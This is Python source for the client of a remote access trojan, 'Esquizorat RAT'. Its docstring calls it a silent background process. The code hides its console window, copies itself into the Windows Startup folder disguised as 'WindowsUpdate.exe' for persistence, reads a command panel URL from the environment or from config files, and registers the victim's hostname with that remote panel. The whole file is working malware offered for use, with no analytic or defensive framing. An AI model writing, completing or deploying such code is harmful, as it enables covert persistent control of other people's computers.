"""
Esquizorat RAT Client
Silent background process - no console output
Connects to web panel via CentralClient
"""
import sys, os, platform, time, threading, subprocess

REDIRECT_OUTPUT = False

def hide_console():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def add_persistence():
    try:
        import shutil
        exe_path = sys.executable
        startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup_dir, 'WindowsUpdate.exe')
        if not os.path.exists(dest):
            shutil.copy2(exe_path, dest)
    except:
        pass

def get_panel_url():
    url = os.environ.get('PANEL_URL', '')
    if url:
        return url
    
    config_paths = [
        os.path.join(os.path.dirname(sys.executable), 'config.json'),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json'),
        os.path.join(os.environ.get('TEMP', ''), 'config.json'),
    ]
    for p in config_paths:
        try:
            if os.path.exists(p):
                import json
                with open(p, 'r') as f:
                    cfg = json.load(f)
                url = cfg.get('panel_url', '') or cfg.get('api', {}).get('panel_url', '')
                if url:
                    return url
        except:
            pass
    
    return ''

def main():
    try:
        hide_console()
        
        if REDIRECT_OUTPUT:
            sys.stdout = open(os.devnull, 'w')
            sys.stderr = open(os.devnull, 'w')
    except:
        pass
    
    panel_url = get_panel_url()
    if not panel_url:
        return
    
    from central_client import CentralClient
    
    client = CentralClient(
        central_server_url=panel_url,
        pc_name=platform.node()
    )
    
    if client.register():
        try:
            while client.running:
                time.sleep(5)
        except:
            client.stop()

if __name__ == "__main__":
    main()
